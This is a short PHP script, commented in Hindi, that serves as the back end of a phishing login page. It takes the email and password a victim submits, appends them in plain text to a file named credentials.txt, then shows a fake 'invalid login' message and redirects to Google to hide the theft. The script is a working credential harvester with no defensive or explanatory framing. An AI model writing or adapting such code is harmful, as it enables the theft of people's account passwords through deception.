<?php
$email = $_POST['email'];
$password = $_POST['password'];

// डेटा को एक फाइल में सेव करना
$file = fopen("credentials.txt", "a");
fwrite($file, "Email: $email | Password: $password\n");
fclose($file);

echo "Invalid login credentials. Please try again.";
header("Location: https://www.google.com");
exit;

?>